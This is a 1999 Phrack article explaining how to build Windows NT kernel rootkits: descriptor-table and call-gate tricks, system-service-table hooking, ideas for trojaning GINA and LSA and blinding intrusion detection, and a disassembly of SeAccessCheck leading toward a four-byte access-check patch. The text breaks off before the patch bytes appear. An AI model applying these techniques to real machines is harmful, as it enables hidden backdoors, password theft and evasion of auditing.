@@ -1,0 +1,1687 @@
+-------[  Phrack Magazine --- Vol. 9 | Issue 55 --- 09.09.99 --- 05 of 19  ]
+
+
+-------------------------[  A *REAL* NT Rootkit, patching the NT Kernel  ]
+
+
+--------[  Greg Hoglund <hoglund@ieway.com>  ]
+
+
+Introduction
+------------
+
+First of all, programs such as Back Orifice and Netbus are NOT rootkits.  They
+are amateur versions of PC-Anywhere, SMS, or a slew of other commercial
+applications that do the same thing.  If you want to remote control a
+workstation, you could just as easily purchase the incredibly powerful SMS
+system from Microsoft.  A remote-desktop/administration application is NOT a
+rootkit.
+
+What is a rootkit?  A rootkit is a set of programs which *PATCH* and *TROJAN*
+existing execution paths within the system.  This process violates the
+*INTEGRITY* of the TRUSTED COMPUTING BASE (TCB).  In other words, a rootkit is
+something which inserts backdoors into existing programs, and patches or breaks
+the existing security system.
+
+- A rootkit may disable auditing when a certain user is logged on.
+- A rootkit could allow anyone to log in if a certain "backdoor" password is
+  used.
+- A rootkit could patch the kernel itself, allowing anyone to run privileged
+  code if they use a special filename.
+
+The possibilities are endless, but the point is that the "rootkit" involves
+itself in pre-existing architecture, so that it goes un-noticed.  A remote
+administration application such as PC Anywhere is exactly that, an application.
+A rootkit, on the other hand, patches the already existing paths within the
+target operating system.
+
+To illustrate this, I have included in this document a 4-byte patch to the NT
+kernel that removes ALL security restrictions from objects within the NT
+domain.  If this patch were applied to a running PDC, the entire domain's
+integrity would be violated.  If this patch goes unnoticed for weeks or even
+months, it would be next to impossible to determine the damage.
+
+
+Network based security & the Windows NT Trust Domain
+----------------------------------------------------
+
+If you know much about the NT Kernel, you know that one of the executive
+components is called the Security Reference Monitor (SRM).  The DoD Red Book
+also defines a "Security Reference Monitor".  We are talking the same language.
+In the Red Book, a security domain is managed by a single entity.
+
+To Quote:
+"A single trusted system is accredited as a single entity by a single
+accrediting authority.  A ``single trusted system'' network implements a
+reference monitor to enforce the access of subjects to objects in accordance
+with an explicit and well defined network security policy [DoD Red Book]."
+
+In NT parlance, that is called the Primary Domain Controller (PDC).  Remember
+that every system has local security and domain security.  In this case, we are
+talking about the domain security.  The PDC's "Security Reference Monitor" is
+responsible for managing all of the objects within the domain.  In doing this,
+it creates a single point of control, and therefore a "single trusted system"
+network.
+
+
+How to violate system integrity
+-------------------------------
+
+I know this is alot of book theory, but bear with me just a bit longer.  The
+DoD Orange Book also defines a "Trusted Computing Base" (TCB).  If you are an
+NT programmer, then you have likely worked with the security privilege
+SE_TCB_PRIVILEGE.  That privilege maps to the more familiar "act as part of the
+Operating System" User-Right.  Using the User Administrator for NT you can
+actually add this privilege to a user.
+
+If you have the ability to act as part of the TCB, you can basically do
+anything.  There is very little security implemented between your process and
+the rest of the machine.  If the TCB can no longer be trusted, then the
+integrity of the entire network system is shot.  The patch I am about to show
+you is an example of this.  The patch, if installed on a Workstation, violates
+a network "partition".  The patch, if installed on a PDC, violates the entire
+network's integrity.
+
+What is a partition?
+
+The Red Book breaks the network into NTCB (Network Trusted Computing Base)
+"Partitions".  Any single component or machine on the network may be considered
+a "partition".  This makes it convenient for analysis.
+
+To Quote:
+"An NTCB that is distributed over a  number  of  network components is referred
+to as partitioned, and that part of the NTCB residing in a given component is
+referred to as an NTCB partition.  A network host may possess a TCB that has
+previously been evaluated as a stand-alone system.  Such a TCB does not
+necessarily coincide with the NTCB partition in the host, in the sense of
+having the same security perimeter [DoD Red Book]."
+
+On the same host you may have two unique regions, the TCB, which is the
+traditional Orange Book evaluation for Trusted Computing Base, and the NTCB.
+These partitions do not have to overlap, but they can.  If any component of one
+is violated, it is likely that the other is as well.  In other words, if a host
+is compromised, the NTCB may also be compromised.
+
+Obviously to install a patch over the TCB, you must already be Administrator,
+or have the ability to install a device driver.  Given that Trojans and Virii
+work so well, it would be very easy to cause this patch to be installed w/o
+someone's knowledge.
+
+
+Imagine an exploit
+------------------
+
+Before I digress into serious techno-garble, consider some of the attacks that
+are possible by patching the NT kernel.  All of these are possible because we
+have violated the TCB itself:
+
+1. Insert invalid data.  Invalid data can be inserted into any network stream.
+   It can also introduce errors into the fixed storage system, perhaps subtly
+   over time, such that even the backups get corrupted.  This violates
+   reliability & integrity.
+
+2. Patch incoming ICMP.  Using ICMP as a covert channel, the patch can read
+   ICMP packets coming into the kernel for embedded commands.
+
+3. Patch incoming ethernet.  It can act as a sniffer, but without all of the
+   driver components.  If it has patched the ethernet, then it can also stream
+   data in/out of the network.  It can sniff crypto keys.
+
+4. Patch existing DLL's, such as wininet.dll, capturing important data.
+
+5. Patch the IDS system.   It can patch a program such as Tripwire or
+   RealSecure to violate its integrity, rendering the program unable to detect
+   the nastiness...
+
+6. Patch the auditing system, i.e., event log, to ignore certain event log
+   messages.
+
+Now for the rare steak.  Let's delve into an actual kernel patch.  If you
+already understand protected mode and the global descriptor table, then you can
+skip this next section.  Otherwise put on your hiking boots, there are a couple
+of switchbacks ahead.
+
+
+Rings of Power
+--------------
+
+Windows NT is unlike DOS or Windows 95 in that it has process-space security.
+Every user-mode process has an area of memory that is protected by a Security
+Descriptor.  Usually this SD is determined from the Access Token of the user
+that started the process.  Access to all objects is handled through a "Access
+Control List".  For Windows NT, this is called "Discretionary Access Control".
+Personally I find it really hard to grasp something if I don't understand it's
+most basic details.  So, this next section describes the very foundation that
+makes security possible on the x86 architecture.
+
+First, it is important to understand "protected mode".  Protected mode can only
+be understood by memory addressing.  Almost all of the expanded capabilities of
+the x86 processor are built upon memory addressing.  Protected mode gives you
+access to a 4 GB memory space.  Multitasking and privilege levels are all
+based upon tricks with memory addressing.  This discussion only applies to 386
+and beyond.
+
+Memory is divided into code and data segments.  In protected mode, all memory
+is addressed as a segment + an offset.  Conversely, in real mode, everything is
+interpreted as an actual address.  For our discussion, we only care about
+protected mode.  In protected mode things get a little more complicated.  We
+must address first the segment, followed by an offset into that segment.  It
+is sort of a two step process.  Why is this interesting??  This is how most
+modern operating systems work, and it is important for exploits and Virii.  Any
+modern mobile code must be able to work within this arena.
+
+What is a selector?
+
+A selector is just a fancy word for a memory segment.  Memory segments are
+organized by a table.  These table entries are often called descriptors.  So,
+remember, a selector is-a segment is-a descriptor.  It's all the same thing.
+
+If you understand how the memory segments are kept track of, then you pretty
+much understand the whole equation.   Every memory segment is first a virtual
+address (16-bits) plus an offset from that address (32-bits).  A segment is not
+an actual address, like in realmode, but the number of a selector it wants to
+use.  A selector is usually a small integer number.  This small number is an
+offset into a table of descriptors.  In turn, the descriptor itself then has
+the actual linear address of the beginning of the memory segment.  In addition
+to that, the descriptor has the access privilege of the memory segment.
+
+Descriptors are stored in a table called the Global Descriptor Table (GDT).
+Each descriptor has a Descriptor Privilege Level (DPL), indicating what ring
+the memory segment runs in.
+
+Suffice it to say, the selector is your vehicle.  Under NT and 95, there
+are selectors which cover the entire 4GB address range.  If you were using
+one of these selectors, you could walk all over the memory map from 0 to
+whatever.  These selectors do exist, and they are protected by a DPL of 0.
+Under Windows 9x, selector 28 is a ring 0 that covers the entire 4gb region.
+Under NT, selectors 8 and 10 achieve the same purpose.
+
+Dumping the GDT from SoftIce produces a table similar to this:
+
+GDTBase=80036000 Limit=0x03FF
+
+0008  Code32   00000000  FFFFFFFF  0     P   RE
+0010  Data32   00000000  FFFFFFFF  0     P   RW
+001B  Code32   00000000  FFFFFFFF  3     P   RE
+0023  Data32   00000000  FFFFFFFF  3     P   RW
+0028  TSS32    8001D000  000020AB  0     P   B
+0048  Reserved 00000000  00000000  0     NP
+0060  Data16   00000400  0000FFFF  3     P   RW
+etc, etc ....
+
+You can see what segment you are currently using by checking the CPU registers.
+The registers SS, DS, and CS indicate which selectors are being used for Stack
+Segment, Code Segment, and Data Segment.  The stack and code segments must be
+in the same ring.
+
+1. Segments can overlap one another.  In other words, more than one segment can
+represent the same address-space.  Segments can overlap one another wholly, or
+only in part.  The address range for a segment is important, of course, but
+there is other delicious information we care about.  For instance, a segment
+also has a Privilege Level (DPL).
+
+ ----     ----
+|    |   |    |
+|    |   |    |
+|    |    ----
+|    |         ----
+|    |        |    |
+|    |        |    |
+ ----         |    |
+              |    |
+               ----
+
+What is a DPL?
+
+Descriptor Privilege Level.  This is important to understand.  Every memory
+segment is protected by a privilege level, often called a "ring".  The Intel
+processor has 4 rings, 0 through 3, usually only ring 0 and 3 are used.  Lower
+ring levels have more privilege.  In order to access a memory segment, the
+caller must have a current privilege level equal to or lower than the one being
+accessed.  Current privilege level is often called CPL, and descriptor
+privilege level is often called DPL.
+
+This type of protection is a requirement for almost any security architecture.
+In the old days of DOS, mobile code such as virii were able to hook interrupts
+and execute any code at whim.  They were walking all over the memory map at
+will.  No such luck with the advent of Windows NT.  There's a gaping need for
+Windows NT exploits that can take advantage of the old tricks.  The central
+problem is that most code is executing within user mode, and has not access to
+ring 0, and therefore no access to the Interrupt Descriptor Table or the
+memory map as a whole.
+
+Under NT, the access to ring 0 is controlled from the right to add your own
+selector to the GDT.  When you transition to ring 0, you are still in protected
+mode and the Virtual Memory Manager is still operating.
+
+Lets suppose you have written a virus that patches the Global Descriptor Table
+(GDT) and adds a new descriptor.  This new descriptor describes a memory
+segment that covers the entire range of the map, from 0 to FFFFFFFF___.  The
+DPL of the descriptor is 0, so any code running from it can access other ring-0
+segments.  In fact, it can access the entire map.  A DPL 0 memory segment
+marked as "conforming" will violate integrity.  The sensitivity label, in this
+regard, would be the DPL.  The fact it is conforming violates the DPL's of
+other segments, if they overlap.
+
+If your descriptor is marked conforming, it can be called freely from ring-3
+(user mode).  This new entry goes unnoticed, of course.  Who monitors the GDT
+on their system?  Most people don't even know what that is.  There are few IDS
+systems that monitor this type of information.  Now you have effectively placed
+a backdoor into the memory map.  You could be running under any process token,
+and have full read/write access to the map.  This means reading/writing other
+important tables, such as the Interrupt Table.  This means reading other
+procii's protected memory.  This means infecting other files and procii w/ your
+virii at whim.
+
+
+Patching the SRM
+----------------
+
+The Security Reference Monitor is responsible for enforcing access control.
+Under NT, all of the SRM functions are handled by ntoskrnl.exe.  If the
+integrity of that code were violated, then the SRM could no longer be trusted.
+The whole security system has failed.
+
+The Security Reference Monitor is responsible for saying Yes/No to any object
+access.  It consults a process table to determine your current running process'
+access token.  It then compares the access token with the required access of
+the object.  Every object has a Security Descriptor (SD).  Your running 
+process has an Access Token.  Comparing these two structures, the SRM is able 
+to deny or allow you access to the object.
+
+orange book:
+"In October of 1972, the Computer Security Technology Planning Study, conducted
+by James P.  Anderson & Co., produced a report for the Electronic Systems
+Division (ESD) of the United States Air Force.[1]  In that report, the concept
+of "a reference monitor which enforces the authorized access relationships
+between subjects and objects of a system" was introduced.  The reference
+monitor concept was found to be an essential element of any system that would
+provide multilevel secure computing facilities and controls."
+
+It then listed the three design requirements that must be met by a reference
+validation mechanism:
+     a. The reference validation mechanism must be tamper proof.
+     b. The reference validation mechanism must always be invoked.
+     c. The reference validation mechanism must be small enough to be
+        subject to analysis and tests, the completeness of which can
+        be assured."[1]
+
+The SRM is *NOT* tamper proof.  It may be protected by the TCB security
+privilege, but I suggest that the only truly tamper-proof SRM is going to use
+cryptographic mechanisms.  Using an attack vector such as Virii or Trojan's, a
+patch could easily be placed within the TCB.
+
+You can patch the SRM itself if you have access to the map.  In this, you can
+insert a backdoor such that a certain user-id ALWYAS has access.  However, this
+does not require you to edit the user's security level in any way.  You are
+patching it at the access point, not the source.  So, auditing programs will
+not be able to notice the problem.  This is a simple trick that could be
+employed in any NT RootKit.
+
+There are several key components to the NT Kernel.  They are sometimes
+referred to as the "NT Executive".  The NT executive is really a group of
+individual components with a well defined interface.  Each component has such a
+well defined interface, in fact, that you could actually take it out completely
+and replace it with a new one.  As long as the new component implemented all of
+the same interfaces, then the system would continue to function.  The following
+are all components of the NT Executive:
+
+   HAL: Hardware Abstraction Layer, HAL.DLL
+   NTOSKERNL:  Contains several components, NTOSKRNL.EXE
+      The Virtual Memory Manager (VMM)
+      The Security Reference Monitor (SRM)
+      The I/O Manager
+      The Object Manager
+      The Process and Thread Manager
+      The Kernel Services themselves
+       -(Exception handling and runtime library)
+      LPC Manager (Local Procedure Call)
+
+Hey, these are some of the modules listed when a Blue Screen occurs!  The
+system is just a big memory map!
+
+With all of this data we are bound to find structures of interest!  Many key
+data structures are crucial to security.  Once we know what we are looking for,
+we can get into SoftIce and start poking around.  A list of the exported
+functions for some of these components is in Appendix A.
+
+Using a tool such as SoftIce, reverse engineering the SRM and other components
+is easy ;)  The methodology is simple.  First, we must find the component we
+are interested in.  They all sit in system memory at some point...
+
+Some key data structures are:
+    ACL (Access Control List), contains ACE's
+    ACE (Access Control Entry), has a 32-bit Access Mask and a SID
+    SID (Security Identifier), a big number
+    PTE (Page Table Entry)
+    SD  (Security Descriptor), has an Owner SID, a Group SID, and an ACL
+    AT  (Access Token)
+
+Now for some tricks!  The first thing we need to do is identify which of these
+data structures we will be using.  If we want to reverse engineer the Security
+Reference Monitor, then we can be assured that our SID is going to be used in
+some call somewhere.. This is where SoftIce comes in.  SoftIce has an
+incredible feature called expressions.  SoftIce will let you define a regular
+expression to be evaluated for a breakpoint.  In other words, I can tell
+SoftIce to break if only a special set of circumstances has occurred.
+
+So, for example (working implementation):
+
+1. I want softice to break if the ESI register references my SID.  Since a SID
+is many words long, I will have to define the expression in several portions:
+
+bpx (ESI->0 == 0x12345678) && (ESI->4 == 0x90123456) && (ESI->8 == 0x78901234)
+
+What I have done here is tell softice to break if the ESI register points to
+the data: 0x123456789012345678901234.  Notice how I use the -> operator to
+offset ESI for each word.
+
+Now, try to access an object.  SoftIce will promptly break when your SID is
+used in a call.
+
+There are many system components that are worth reverse engineering.  You may
+also want to play with the following:
+    1. GINA, (GINA.DLL) The logon screen you see when you type your
+       password. Imagine if this component was trojaned.. A Virii could
+       capture passwords across the enterprise.
+    2. LSA (The Local System Authority) This is the module responsible for
+       querying the SAM database.  This would be an ideal place to put a
+       rootkit-password that *ALWAYS* allows you access to the system.
+    3. SSDT, The System Service Descriptor Table
+    4. GDT, the Global Descriptor Table
+    5. IDT, the Interrupt Descriptor Table
+
+
+Getting to ring zero in the first place
+---------------------------------------
+
+User mode is very limiting under NT.  Your process is bound by the selector it
+is currently using.  The process cannot simply waltz over the entire memory
+map.  As we have discussed, the process must first load a selector.  You cannot
+simply read memory from 0 to FFF_, you can only access your own memory segment.
+
+There are tricks however.  If the process is running under a user token that
+has "add service" privilege, then you can create your own call gate, install
+it in realtime, and then use it to run your code ring 0.  Once you are running
+ring 0 you can patch the IDT or the Kernel.  This is how User-Mode normally
+accesses a Ring-0 Code Segment.  If you don't want to go to this trouble,
+you can upload a byte patcher that runs in ring zero on boot.  This is as
+simple as writing a driver and installing to run on the next reboot.
+However, installing your own call-gate is by far the most sexy.
+
+Lets talk sexy.  The answer is a call gate.  All of the functions provided by
+NTDLL.DLL are implemented this way.  This is why you must call Int 2Eh to make
+a call.  The entire set of Int 2Eh functions are known as the Native Call
+Interface (NCI).  What really happens is the Int 2Eh is handled by a function
+in NTOSKRNL.EXE.  This function is called KiSystemService().  
+KiSystemService() routes the call to the proper code location.
+
+When you make a system call, you must first load the index of the function you
+wish to call.  This is loaded into register EAX.  Next, if the call takes
+parameters, a pointer to this block is loaded into EDX.  Interrupt 2Eh is
+called, and EAX holds the return value.  This is old hat to most assembler
+programmers.
+
+What is not obvious is how this is implemented in the Kernel.  The function
+KiSystemService() is called, and left with the responsibility for dispatching
+the call.  KiSystemService() must first determine *WHAT* function to call next,
+based on what we put in EAX.  So, to this end, it maintains a table of
+functions and their index numbers.. imagine that!  SofIce will dump this table
+if your interested.  It looks something like:
+
+:ntcall
+Service table address: 80149398  Number of services:000000D4
+0000  0008:8017451E  params=06  ntoskrnl!NtConnectPort+0834
+0001  0008:80199C16  params=08  ntoskrnl!SeQueryAuthenticationIdToken+04B8
+0002  0008:8019B3A2  params=0B  ntoskrnl!SePrivilegeObjectAuditAlarm+02B0
+0003  0008:80158E50  params=02  ntoskrnl!NtAddAtom
+0004  0008:80197624  params=06  ntoskrnl!NtAdjustPrivilegesToken+0422
+0005  0008:80197202  params=06  ntoskrnl!NtAdjustPrivilegesToken
+0006  0008:80196256  params=02  ntoskrnl!PsGetProcessExitTime+1848
+0007  0008:8019620E  params=01  ntoskrnl!PsGetProcessExitTime+1800
+0008  0008:8015901E  params=01  ntoskrnl!NtAllocateLocallyUniqueId
+0009  0008:801592EC  params=03  ntoskrnl!NtAllocateUuids
+000A  0008:8017B0F6  params=06  ntoskrnl!NtAllocateVirtualMemory
+000B  0008:8011B8E4  params=03  ntoskrnl!ZwYieldExecution+08AC
+etc etc...
+
+Well, this is all very interesting, but where is this table stored?  How does
+SoftIce manage to read it?  Of course, it's all undocumented ;-)  Here I have
+no one to thank more than my friend from Sri Lanka, a fellow Rhino9 member, who
+goes by the handle Joey__.  His paper on extending the NCI is nothing less than
+mind-blowing.  I draw heavily upon his research for this section.  I feel this
+paper could not be complete without going over call-gates and the NCI, so I
+paraphrase some of his work.  For more detailed information on adding your own
+system services, read his paper entitled "Adding New Services to the NT Kernel
+Native API".
+
+A very interesting thing happens when you boot NT.  You start with about 200
+functions in the NCI.  These are all implemented in NTOSKRNL.EXE.  But, soon
+afterwards, another 500 or so functions are added to the NCI, these being
+implemented in WIN32K.SYS.  The fact that additional functions were added
+proves that it is possible to register new functions into the NCI during
+runtime.
+
+The table that SoftIce dumps when you type NTCALL is called the System Service
+Descriptor Table (SSDT).  The SSDT is what the KiSystemService() function uses
+to look up the proper function for a Int 2Eh call.  Given that the NCI is
+extensible, it must be possible to add new functions to this table.
+
+As it turns out, there are actually multiple tables.  WIN32K.SYS doesn't
+actually add to the EXISTING system table, but creates a whole NEW one with 500
+or so functions, and then ADDS it to the Kernel.  To do this, it calls the
+exported function KeAddSystemServiceTable().  So, in a nutshell, all we have to
+do is create a new table with OUR functions and do the same thing.
+
+Another angle on this involves adding our functions to the existing NCI table.
+But, this involves patching memory.  Again, that's what we do best.  To pull
+this trick off cleanly, we must allocate new memory large enough to hold the
+old tables plus our additional entries.  We then must copy the old tables 
+into our new memory, add our entries, and then patch memory so that 
+KiSystemService() looks at our new table.
+
+
+The FOUR-Byte Patch
+-------------------
+
+Okay, lesson number one.  Don't make yourself do extra work when you don't have
+to.  This is the story of my life.  I started this project by reversing the
+RtlXXX subroutines.  For instance, there is a routine called
+RtlGetOwnerSecurityDescriptor().  This is a simple utility function that
+returns the Owner SID for a given security descriptor.  I patched this routine
+to check for the BUILTIN\Administrators group, and alter it to be the
+BUILTIN\Users group.  Although this patch works, it doesn't help me obtain
+access to protected files and shares.  The RTL routine is only called for
+Process and Thread creation, it would seem.  So, to make a long story short, I
+have included the RTLXXX information and patch below.  It will illustrate a
+working kernel patch and should help you see my thought process as I 0wned a
+key kernel function.
+
+Okay, lesson number two.  If at first you don't succeed, try another function.
+This time I got very wise and decided to test a number of breakpoints in the
+Kernel before doing any extra work. Because I wanted to circumvent access to a
+file directly, I moved directly onward to the SeAccessCheck() function.  Up
+front, I set a breakpoint on this function to make sure it is being called when
+accessing a file.  To my excitement, it appears this function is called for
+almost any object access, not just a file.  This means network shares as well.
+Going further, I tested my next patch against network share access as well as
+file access.  I created a test directory, shared it over the network, and
+created a test file within that directory.
+
+At first, the file had the default Everyone FULL CONTROL permissions.  I set a
+breakpoint on SeAccessCheck() and attempted to cat the file. For this simple
+command the function is called three times:
+
+Break due to BPX ntoskrnl!SeAccessCheck  (ET=2.01 seconds)
+:stack
+Ntfs!PAGE+B683 at 0008:8020C203 (SS:EBP 0010:FD711D1C)
+=> ntoskrnl!SeAccessCheck at 0008:8019A0E6 (SS:EBP 0010:FD711734)
+Break due to BPX ntoskrnl!SeAccessCheck  (ET=991.32 microseconds)
+:stack
+Ntfs!PAGE+B683 at 0008:8020C203 (SS:EBP 0010:FD711CB8)
+=> ntoskrnl!SeAccessCheck at 0008:8019A0E6 (SS:EBP 0010:FD7116D8)
+Break due to BPX ntoskrnl!SeAccessCheck  (ET=637.15 microseconds)
+:stack
+Ntfs!PAGE+B683 at 0008:8020C203 (SS:EBP 0010:FD711D08)
+=> ntoskrnl!SeAccessCheck at 0008:8019A0E6 (SS:EBP 0010:FD711720)
+
+Next I set the file access to Administrator NO ACCESS.  Attempting to cat the
+file locally resulted in an "Access Denied" message. The routine is called 13
+times before the Access Denied message is given.  Now I try to access it over
+the network.  The function is called a total of 18 times before a Access Denied
+message is given.  It would seem it takes alot more work to deny access than it
+does to give it. ;)
+
+I was lit now, it looked like I had my target.  After another 2 shots of
+espresso, I dumped the IDA file for SeAccessCheck, busted into SoftIce and
+started exploring:
+
+To make things simpler, I have removed some of the assembly code that is not
+part of my discussion.  If you are going to start playing with this, then you
+should disassemble all of this yourself nonetheless.  I recommend IDA.  At
+first I tried WDAsm32, but it was unable to decompile the ntoskrnl.exe 
+binary properly.  IDA, on the other hand, had no problems.  WDAsm32 has a 
+much nicer GUI interface, but IDA has proved more reliable.  Just as most 
+engineers, I use many tools to get the job done, so I recommend having both
+disassemblers around.
+
+
+The function & patches:
+8019A0E6 ; Exported entry 816. SeAccessCheck
+8019A0E6
+8019A0E6 ;
+===========================================================================
+8019A0E6
+8019A0E6 ;		 S u b r o u t i n e
+8019A0E6 ; Attributes: bp-based	frame
+8019A0E6
+8019A0E6		 public	SeAccessCheck
+8019A0E6 SeAccessCheck	 proc near
+8019A0E6					 ; sub_80133D06+B0p ...
+8019A0E6
+8019A0E6 arg_0		 = dword ptr  8		 ; appears to point to a
+						 ; Security Descriptor
+8019A0E6 arg_4		 = dword ptr  0Ch
+8019A0E6 arg_8		 = byte	ptr  10h
+8019A0E6 arg_C		 = dword ptr  14h
+8019A0E6 arg_10		 = dword ptr  18h
+8019A0E6 arg_14		 = dword ptr  1Ch
+8019A0E6 arg_18		 = dword ptr  20h
+8019A0E6 arg_1C		 = dword ptr  24h
+8019A0E6 arg_20		 = dword ptr  28h
+8019A0E6 arg_24		 = dword ptr  2Ch
+8019A0E6
+8019A0E6		 push	 ebp
+8019A0E7		 mov	 ebp, esp
+8019A0E9		 push	 ebx
+8019A0EA		 push	 esi
+8019A0EB		 push	 edi
+8019A0EC		 cmp	 byte ptr [ebp+arg_1C],	0
+8019A0F0		 mov	 ebx, [ebp+arg_C]
+8019A0F3		 jnz	 short loc_8019A137
+8019A0F5		 test	 ebx, 2000000h
+8019A0FB		 jz	 short loc_8019A11D
+8019A0FD		 mov	 eax, [ebp+arg_18]
+8019A100		 mov	 edi, [ebp+arg_20]
+8019A103		 mov	 ecx, ebx
+8019A105		 mov	 eax, [eax+0Ch]
+8019A108		 and	 ecx, 0FDFFFFFFh
+8019A10E		 mov	 [edi],	eax
+8019A110		 or	 ecx, eax
+8019A112		 mov	 eax, [ebp+arg_10]
+8019A115		 or	 eax, ecx
+8019A117		 mov	 [edi],	ecx
+8019A119		 mov	 [edi],	eax
+8019A11B		 jmp	 short loc_8019A13A
+8019A11D ;
+===========================================================================
+8019A11D
+8019A11D loc_8019A11D:				 ; CODE	XREF: SeAccessCheck+15
+8019A11D		 mov	 eax, [ebp+arg_10]
+8019A120		 mov	 edi, [ebp+arg_20]
+8019A123		 or	 eax, ebx
+8019A125		 mov	 edx, [ebp+arg_24]
+8019A128		 mov	 [edi],	eax
+8019A12A		 mov	 al, 1
+8019A12C		 mov	 dword ptr [edx], 0
+8019A132		 jmp	 loc_8019A23A
+8019A137 ;
+===========================================================================
+8019A137
+8019A137 loc_8019A137:				 ; CODE	XREF: SeAccessCheck+D
+8019A137		 mov	 edi, [ebp+arg_20]
+8019A13A
+8019A13A loc_8019A13A:				 ; CODE	XREF: SeAccessCheck+35
+8019A13A		 cmp	 [ebp+arg_0], 0
+8019A13E		 jnz	 short loc_8019A150
+8019A140		 mov	 edx, [ebp+arg_24]
+8019A143		 xor	 al, al
+				 ; STATUS_ACCESS_DENIED not hit
+				 ; under normal means
+8019A145		 mov	 dword ptr [edx], 0C0000022h
+8019A14B		 jmp	 loc_8019A23A
+8019A150 ;
+===========================================================================
+8019A150
+8019A150 loc_8019A150:				 ; CODE	XREF: SeAccessCheck+58
+8019A150		 mov	 esi, [ebp+arg_4]
+8019A153		 cmp	 dword ptr [esi], 0
+8019A156		 jz	 short loc_8019A16E
+8019A158		 cmp	 dword ptr [esi+4], 2
+8019A15C		 jge	 short loc_8019A16E
+8019A15E		 mov	 edx, [ebp+arg_24]
+8019A161		 xor	 al, al
+				 ; STATUS_BAD_IMPERSONATION_LEVEL
+				 ; not normally hit
+8019A163		 mov	 dword ptr [edx], 0C00000A5h
+8019A169		 jmp	 loc_8019A23A
+8019A16E ;
+===========================================================================
+8019A16E
+8019A16E loc_8019A16E:				 ; CODE	XREF: SeAccessCheck+70
+8019A16E					 ; SeAccessCheck+76
+8019A16E		 test	 ebx, ebx
+8019A170		 jnz	 short loc_8019A1A0
+8019A172		 cmp	 [ebp+arg_10], 0
+8019A176		 jnz	 short loc_8019A188
+8019A178		 mov	 edx, [ebp+arg_24]
+8019A17B		 xor	 al, al
+				 ; STATUS_ACCESS_DENIED not
+				 ; normally hit
+8019A17D		 mov	 dword ptr [edx], 0C0000022h
+8019A183		 jmp	 loc_8019A23A
+8019A188 ;
+===========================================================================
+8019A188
+8019A188 loc_8019A188:				 ; CODE	XREF: SeAccessCheck+90
+8019A188		 mov	 eax, [ebp+arg_10]
+8019A18B		 xor	 ecx, ecx
+8019A18D		 mov	 edx, [ebp+arg_24]
+8019A190		 mov	 [edi],	eax
+8019A192		 mov	 eax, [ebp+arg_14]
+8019A195		 mov	 [edx],	ecx
+8019A197		 mov	 [eax],	ecx
+8019A199		 mov	 al, 1
+8019A19B		 jmp	 loc_8019A23A
+8019A1A0 ;
+===========================================================================
+8019A1A0
+8019A1A0 loc_8019A1A0:				 ; CODE	XREF: SeAccessCheck+8A
+8019A1A0		 cmp	 [ebp+arg_8], 0
+8019A1A4		 jnz	 short loc_8019A1AC
+8019A1A6		 push	 esi
+8019A1A7		 call	 SeLockSubjectContext
+8019A1AC
+8019A1AC loc_8019A1AC:				 ; CODE	XREF: SeAccessCheck+BE
+8019A1AC		 test	 ebx, 2060000h
+8019A1B2		 jz	 short loc_8019A1EA
+8019A1B4		 mov	 eax, [esi]
+8019A1B6		 test	 eax, eax
+8019A1B8		 jnz	 short loc_8019A1BD
+8019A1BA		 mov	 eax, [esi+8]
+8019A1BD
+8019A1BD loc_8019A1BD:				 ; CODE	XREF: SeAccessCheck+D2
+8019A1BD		 push	 1
+8019A1BF		 push	 [ebp+arg_0]
+8019A1C2		 push	 eax
+8019A1C3		 call	 sub_8019A376
+8019A1C8		 test	 al, al
+8019A1CA		 jz	 short loc_8019A1EA
+8019A1CC		 test	 ebx, 2000000h
+8019A1D2		 jz	 short loc_8019A1DA
+8019A1D4		 or	 byte ptr [ebp+arg_10+2], 6
+8019A1D8		 jmp	 short loc_8019A1E4
+8019A1DA ;
+===========================================================================
+8019A1DA
+8019A1DA loc_8019A1DA:				 ; CODE	XREF: SeAccessCheck+EC
+8019A1DA		 mov	 eax, ebx
+8019A1DC		 and	 eax, 60000h
+8019A1E1		 or	 [ebp+arg_10], eax
+8019A1E4
+8019A1E4 loc_8019A1E4:				 ; CODE	XREF: SeAccessCheck+F2
+8019A1E4		 and	 ebx, 0FFF9FFFFh
+8019A1EA
+8019A1EA loc_8019A1EA:				 ; CODE	XREF: SeAccessCheck+CC
+8019A1EA					 ; SeAccessCheck+E4
+8019A1EA		 test	 ebx, ebx
+8019A1EC		 jnz	 short loc_8019A20C
+8019A1EE		 cmp	 [ebp+arg_8], 0
+8019A1F2		 jnz	 short loc_8019A1FA
+8019A1F4		 push	 esi
+8019A1F5		 call	 SeUnlockSubjectContext
+8019A1FA
+8019A1FA loc_8019A1FA:				 ; CODE	XREF: SeAccessCheck+10
+8019A1FA		 mov	 eax, [ebp+arg_10]
+8019A1FD		 mov	 edx, [ebp+arg_24]
+8019A200		 mov	 [edi],	eax
+8019A202		 mov	 al, 1
+8019A204		 mov	 dword ptr [edx], 0
+8019A20A		 jmp	 short loc_8019A23A
+8019A20C ;
+===========================================================================
+
+Since most of the arguments are being passed to this, it looks like this
+routine is a wrapper for this other one.. lets delve deeper....
+
+8019A20C
+8019A20C loc_8019A20C:				 ; CODE	XREF: SeAccessCheck+106
+8019A20C		 push	 [ebp+arg_24]
+8019A20F		 push	 [ebp+arg_14]
+8019A212		 push	 edi
+8019A213		 push	 [ebp+arg_1C]
+8019A216		 push	 [ebp+arg_10]
+8019A219		 push	 [ebp+arg_18]
+8019A21C		 push	 ebx
+8019A21D		 push	 dword ptr [esi]
+8019A21F		 push	 dword ptr [esi+8]
+8019A222		 push	 [ebp+arg_0]
+8019A225		 call	 sub_80199836		; decompiled below ***
+8019A22A		 cmp	 [ebp+arg_8], 0
+8019A22E		 mov	 bl, al
+8019A230		 jnz	 short loc_8019A238
+8019A232		 push	 esi
+8019A233		 call	 SeUnlockSubjectContext	 ; not usually hit
+8019A238
+8019A238 loc_8019A238:				 ; CODE	XREF: SeAccessCheck+14A
+8019A238		 mov	 al, bl
+8019A23A
+8019A23A loc_8019A23A:				 ; CODE	XREF: SeAccessCheck+4C
+8019A23A					 ; SeAccessCheck+65 ...
+8019A23A		 pop	 edi
+8019A23B		 pop	 esi
+8019A23C		 pop	 ebx
+8019A23D		 pop	 ebp
+8019A23E		 retn	 28h
+8019A23E SeAccessCheck	 endp
+
+
+Subroutine called from SeAccessCheck.  Looks like most of work is being done in
+here.  I will try to patch this routine.
+
+80199836 ;
+==============================================================================
+80199836
+80199836 ;		 S u b r o u t i n e
+80199836 ; Attributes: bp-based	frame
+80199836
+80199836 sub_80199836	 proc near		 ; CODE	XREF: PAGE:80199FFA
+80199836					 ; SeAccessCheck+13F ...
+80199836
